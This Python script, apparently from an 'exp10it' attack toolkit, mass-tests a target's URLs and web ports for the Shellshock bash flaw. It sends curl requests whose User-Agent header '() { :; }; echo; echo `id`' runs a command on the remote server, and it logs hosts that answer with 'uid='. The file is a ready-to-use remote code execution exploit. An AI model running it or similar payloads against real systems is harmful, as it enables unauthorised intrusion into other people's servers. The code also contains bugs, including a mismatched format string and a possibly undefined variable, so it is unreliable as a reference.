# http://blog.knownsec.com/2014/10/shellshock_response_profile_v4/#more-1559
# bash rce
import re
import sys
import os
from exp10it import get_target_urls_from_db
from exp10it import execute_sql_in_db
from urllib.parse import urlparse
from exp10it import get_string_from_command
from exp10it import CLIOutput
from exp10it import figlet2file
from exp10it import get_target_table_name_list
from exp10it import COMMON_NOT_WEB_PORT_LIST
from exp10it import get_http_domain_from_url
from exp10it import get_target_open_port_list

current_dir = os.path.split(os.path.realpath(__file__))[0]

cgiList = [
    "/cgi-bin/load.cgi",
    "/cgi-bin/gsweb.cgi",
    "/cgi-bin/redirector.cgi",
    "/cgi-bin/test.cgi",
    "/cgi-bin/index.cgi",
    "/cgi-bin/help.cgi",
    "/cgi-bin/about.cgi",
    "/cgi-bin/vidredirect.cgi",
    "/cgi-bin/click.cgi",
    "/cgi-bin/details.cgi",
    "/cgi-bin/log.cgi",
    "/cgi-bin/viewcontent.cgi",
    "/cgi-bin/content.cgi",
    "/cgi-bin/admin.cgi",
    "/cgi-bin/webmail.cgi",
]

target = sys.argv[1]
http_domain = get_http_domain_from_url(target)
urls = get_target_urls_from_db(target, "exp10itdb")
urls.append(target)

for eachUrl in urls:
    if "^" in eachUrl:
        eachUrl = eachUrl.split("^")[0]
    parsed = urlparse(eachUrl)
    url = parsed.scheme + "://" + parsed.netloc + parsed.path
    if re.search(r"\.cgi$", url, re.I):
        a = get_string_from_command(
            "curl '%s' -A '() { :; }; echo; echo `id`' -k" % url)
        if re.search(r"uid=", a, re.I):
            string_to_write = "Congratulations! shellshock vul exists on %s\n%s" % url
            CLIOutput().good_print(string_to_write)
            with open("%s/result.txt" %
                      current_dir, "a+") as f:
                f.write(string_to_write)


if target[:4] == "http":
    hostname = urlparse(target).hostname
figlet2file("test shellshock vul for %s" % target, 0, True)
target_table_name = get_target_table_name_list(target)[0]
result = execute_sql_in_db("select port_scan_info from %s where http_domain='%s'" %
                           (target_table_name, http_domain), "exp10itdb")


open_port_list = get_target_open_port_list(target)
parsed = urlparse(target)
if ":" in parsed.netloc:
    open_port_list.append(parsed.netloc.split(":")[1])


for eachPort in open_port_list:
    if eachPort not in COMMON_NOT_WEB_PORT_LIST:
        for eachCgi in cgiList:
            a = get_string_from_command(
                "curl '%s' -A '() { :; }; echo; echo `id`' -k" % (hostname + ":" + eachPort + eachCgi))
            if re.search(r"uid=", a, re.I):
                string_to_write = "Congratulations! shellshock vul exists on %s\n%s" % (
                    hostname + ":" + eachPort + eachCgi, a)
                CLIOutput().good_print(string_to_write)
                with open("%s/result.txt" % current_dir, "a+") as f:
                    f.write(string_to_write)
else:
    print("coz I found no nmap scan result from database,I will not run shellshock vul check module on other ports")
